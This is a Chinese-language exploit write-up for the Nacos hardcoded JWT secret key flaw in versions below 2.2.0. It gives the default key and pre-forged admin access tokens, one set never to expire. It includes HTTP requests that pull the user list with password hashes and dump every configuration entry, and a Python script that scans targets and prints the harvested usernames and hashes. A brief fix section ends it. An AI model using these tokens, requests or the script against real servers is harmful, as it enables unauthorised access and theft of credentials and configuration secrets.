## 漏洞描述

Nacos <2.2.0 版本使用硬编码的JWT SecretKey `SecretKey012345678901234567890123456789012345678901234567890123456789`，攻击者可伪造任意用户的AccessToken绕过认证，获取用户列表（含密码哈希）、读取所有配置信息等。

## 影响版本

- Nacos < 2.2.0

## 利用步骤

### 可用JWT Token

**默认密钥生成的管理员Token（永不过期）：**
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
```

**另一个常用Token：**
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc1OTE1MTExOH0.Q8uloHU9OVl-RDjvG5xwunszqbRjA80-SoJdirJ0rdU
```

### 1. 获取用户列表（含密码哈希）

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1
Host: <target>:8848
Accept: */*
```

返回中包含 `"username":` 和 `"password":` 字段则存在漏洞。

### 2. 读取所有配置

```http
GET /nacos/v1/cs/configs?dataId=*&group=*&appName=&config_tags=&pageNo=1&pageSize=10000&tenant=*&search=blur&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1
Host: <target>:8848
Accept: */*
```

**注意：同时尝试 `/v1/auth/users` 和 `/nacos/v1/auth/users` 两个路径。**

## Payload

```python
import requests
from urllib.parse import urljoin

JWT_TOKEN = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"

def check_jwt_bypass(target):
    """检测Nacos JWT默认密钥认证绕过"""
    for path in ['/nacos/v1/auth/users', '/v1/auth/users']:
        url = urljoin(target, path)
        try:
            r = requests.get(url, params={'pageNo': '1', 'pageSize': '10', 'accessToken': JWT_TOKEN},
                           headers={'Accept': '*/*'}, timeout=10, verify=False)
            if r.status_code == 200 and '"username":' in r.text and '"password":' in r.text:
                print(f"[+] {target} 存在JWT默认密钥认证绕过")
                print(f"[+] 路径: {path}")
                try:
                    data = r.json()
                    for user in data.get('pageItems', []):
                        print(f"    用户: {user.get('username')}, 密码哈希: {user.get('password')}")
                except:
                    print(f"    响应: {r.text[:200]}")
                return True
        except:
            continue
    print(f"[-] {target} 不存在JWT默认密钥绕过")
    return False

# 使用
# check_jwt_bypass("http://target:8848")
```

## 修复建议

1. 升级 Nacos 至 2.2.0+
2. 修改 `application.properties` 中的 `nacos.core.auth.plugin.nacos.token.secret.key` 为随机强密钥
3. 启用认证并设置强密码
